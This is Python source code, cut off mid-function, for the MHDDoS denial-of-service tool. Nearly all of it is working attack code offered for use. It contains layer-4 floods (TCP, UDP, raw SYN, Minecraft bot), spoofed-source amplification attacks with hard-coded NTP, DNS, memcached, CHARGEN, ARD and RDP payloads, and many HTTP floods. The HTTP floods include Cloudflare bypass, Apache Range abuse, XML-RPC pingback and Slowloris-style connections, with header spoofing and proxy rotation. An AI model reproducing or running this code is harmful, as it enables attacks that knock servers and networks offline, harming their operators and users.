#!/usr/bin/env python3
import ctypes
import itertools
import math
import os
from _socket import SHUT_RDWR
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice
from random import randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run
from sys import argv
from sys import exit as _exit
from threading import Event, Lock, Thread
from time import sleep, time, perf_counter
from typing import Any, List, Set, Tuple, Union
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cfscrape import create_scraper
from dns import resolver
from humanfriendly.terminal import ansi_wrap
from icmplib import ping, Host
from impacket.ImpactPacket import IP, TCP, UDP, Data
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, RequestException
from yarl import URL

from MHDDoS.utils.console_utils import clear_lines_from_console

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__: str = "2.3 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
bombardier_path: str = ""


def getMyIPAddress():
    global __ip__
    if __ip__:
        return __ip__
    with suppress(Exception):
        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
    with suppress(Exception):
        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
    with suppress(Exception):
        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
    with suppress(Exception):
        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
    with suppress(Exception):
        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
    with suppress(Exception):
        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
    return getMyIPAddress()


def exit(*message):
    if message:
        logger.error(" ".join(message))
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER"
    }

    LAYER4_METHODS: Set[str] = {
        "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
        "CHAR", "RDP", "MCBOT"
    }
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Counter(object):

    def __init__(self, value=0):
        self._value = RawValue(ctypes.c_longlong, value)
        self._lock = Lock()

    def __iadd__(self, value):
        with self._lock:
            self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        with self._lock:
            self._value.value = value
        return self


REQUESTS_SENT = Counter()
bytes_sent = Counter()
TOTAL_REQUESTS_SENT = Counter()
TOTAL_BYTES_SENT = Counter()


class Tools:

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return f"-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            with suppress(Exception):
                while self._synevent.is_set():
                    self.SENT_FLOOD()

    def get_effective_socket(self,
                             conn_type=AF_INET,
                             sock_type=SOCK_STREAM,
                             proto_type=IPPROTO_TCP):
        if self._proxies:
            return randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        return socket(conn_type, sock_type, proto_type)

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
        if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
        if name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (
                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> None:
        global bytes_sent, REQUESTS_SENT
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)
                while s.send(randbytes(1024)):
                    REQUESTS_SENT += 1
                    bytes_sent += 1024
        except Exception:
            s.close()

    def MINECRAFT(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = Minecraft.handshake(self._target, 74, 1)
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)

                s.send(payload)
                bytes_sent += len(payload)

                while s.send(b'\x01'):
                    s.send(b'\x00')
                    REQUESTS_SENT += 2
                    bytes_sent += 2

        except Exception:
            s.close()

    def UDP(self) -> None:
        global bytes_sent, REQUESTS_SENT
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto(randbytes(1024), self._target):
                    REQUESTS_SENT += 1
                    bytes_sent += 1024

        except Exception:
            s.close()

    def SYN(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = self._genrate_syn()
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(payload, self._target):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload)

        except Exception:
            s.close()

    def AMP(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = next(self._amp_payloads)
        try:
            with socket(AF_INET, SOCK_RAW,
                        IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(*payload):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload[0])

        except Exception:
            s.close()

    def MCBOT(self) -> None:
        global bytes_sent, REQUESTS_SENT
        login = Minecraft.login("MHDDoS_" + ProxyTools.Random.rand_str(5))
        handshake = Minecraft.handshake_forwarded(self._target,
                                                  47,
                                                  2,
                                                  ProxyTools.Random.rand_ipv4(),
                                                  uuid4())
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)

                s.send(handshake)
                s.send(login)
                bytes_sent += (len(handshake + login))
                REQUESTS_SENT += 2

                while s.recv(1):
                    keep = Minecraft.keepalive(randint(1000, 123456))
                    s.send(keep)
                    bytes_sent += len(keep)
                    REQUESTS_SENT += 1
                    c = 5
                    while c:
                        chat = Minecraft.chat(ProxyTools.Random.rand_str(255))
                        s.send(chat)
                        REQUESTS_SENT += 1
                        bytes_sent += len(chat)
                        sleep(1.2)
                        c -= 1

        except Exception:
            s.close()

    def VSE(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = (
            b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
            b'\x20\x51\x75\x65\x72\x79\x00')
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto(payload, self._target):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload)
        except Exception:
            s.close()

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(getMyIPAddress())
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(randint(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


# noinspection PyBroadException
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            with suppress(Exception):
                while self._synevent.is_set():
                    self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        payload: str = ""
        payload += "X-Forwarded-Proto: Http\r\n"
        payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
        payload += f"Via: {spoof}\r\n"
        payload += f"Client-IP: {spoof}\r\n"
        payload += f'X-Forwarded-For: {spoof}\r\n'
        payload += f'Real-IP: {spoof}\r\n'
        return payload

    def generate_payload(self, other: str = None) -> bytes:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += other if other else ""
        return str.encode(f"{payload}\r\n")

    def open_connection(self) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket()

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.connect(self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        payload: str = ""
        payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
        payload += f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
        payload += self.SpoofIP
        return payload

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", } \
            else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def STRESS(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            (f"Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def COOKIES(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (randint(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def APACHE(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def XMLRPC(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def PPS(self) -> None:
        global bytes_sent, REQUESTS_SENT
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(self._defaultpayload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(self._defaultpayload)
        except Exception:
            s.close()

    def GET(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def BOT(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        try:
            with self.open_connection() as s:
                s.send(p1)
                s.send(p2)
                bytes_sent += len(p1 + p2)
                REQUESTS_SENT += 2

                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def EVEN(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                while s.send(payload) and s.recv(1):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload)
        except Exception:
            s.close()

    def OVH(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(min(self._rpc, 5)):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def CFB(self):
        pro = None
        global bytes_sent, REQUESTS_SENT
        if self._proxies:
            pro = randchoice(self._proxies)
        try:
            with create_scraper() as s:
                for _ in range(self._rpc):
                    if pro:
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        bytes_sent += Tools.sizeOfRequest(res)
        except Exception:
            s.close()

    def CFBUAM(self):
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                sleep(5.01)
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def AVB(self):
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    sleep(max(self._rpc / 1000, 1))
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def DGB(self):
        global bytes_sent, REQUESTS_SENT
        with create_scraper() as s:
            try:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    if self._proxies:
                        pro = randchoice(self._proxies)
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        bytes_sent += Tools.sizeOfRequest(res)
            except Exception:
                s.close()

    def DYN(self):
        global bytes_sent, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6),
                                        self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def DOWNLOADER(self):
        global bytes_sent, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6),
                                        self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
                        while 1:
                            sleep(.01)
                            data = s.recv(1)
                            if not data:
                                break
                s.send(b'0')
                bytes_sent += 1

        except Exception:
            s.close()

    def BYPASS(self):
        global REQUESTS_SENT, bytes_sent
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        try:
            with Session() as s:
                for _ in range(self._rpc):
                    if pro:
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        bytes_sent += Tools.sizeOfRequest(res)
        except Exception:
            s.close()

    def GSB(self):
        global bytes_sent, REQUESTS_SENT
        payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                self._target.raw_path_qs,
                                                ProxyTools.Random.rand_str(6))
        payload = (payload + 'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n')
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def NULL(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += "User-Agent: null\r\n"
        payload += "Referrer: null\r\n"
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def SLOW(self):
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
                while s.send(payload) and s.recv(1):
                    for i in range(self._rpc):
                        keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
                        if s.send(keep):
                            sleep(self._rpc / 15)
                            REQUESTS_SENT += 1
                            bytes_sent += len(keep)
                    break
        except Exception:
            s.close()

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST":
            self.SENT_FLOOD = self.POST
        if name == "CFB":
            self.SENT_FLOOD = self.CFB
        if name == "CFBUAM":
            self.SENT_FLOOD = self.CFBUAM
        if name == "XMLRPC":
            self.SENT_FLOOD = self.XMLRPC
        if name == "BOT":
            self.SENT_FLOOD = self.BOT
        if name == "APACHE":
            self.SENT_FLOOD = self.APACHE
        if name == "BYPASS":
            self.SENT_FLOOD = self.BYPASS
        if name == "OVH":
            self.SENT_FLOOD = self.OVH
        if name == "AVB":
            self.SENT_FLOOD = self.AVB
        if name == "STRESS":
            self.SENT_FLOOD = self.STRESS
        if name == "DYN":
            self.SENT_FLOOD = self.DYN
        if name == "SLOW":
            self.SENT_FLOOD = self.SLOW
        if name == "GSB":
            self.SENT_FLOOD = self.GSB
        if name == "NULL":
            self.SENT_FLOOD = self.NULL
        if name == "COOKIE":
            self.SENT_FLOOD = self.COOKIES
        if name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (
                    self._defaultpayload +
                    "Host: %s\r\n\r\n" % self._target.authority).encode()
        if name == "EVEN": self.SENT_FLOOD = self.EVEN
        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
        if name == "BOMB": self.SENT_FLOOD = self.BOMB

    def BOMB(self):
        pro = randchoice(self._proxies)
        global bombardier_path

        run([
            f'{Path.home() / "go/bin/bombardier"}',
            f'{bombardier_path}',
            f'--connections={self._rpc}',
            '--http2',
            '--method=GET',
            '--no-print',
            '--timeout=5s',
            f'--requests={self._rpc}',
            f'--proxy={pro}',
            f'{self._target.human_repr()}',
        ])


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info("Downloading Proxies form %d Providers" % len(providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            "Downloading Proxies form (URL: %s, Type: %s, Timeout: %d)" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
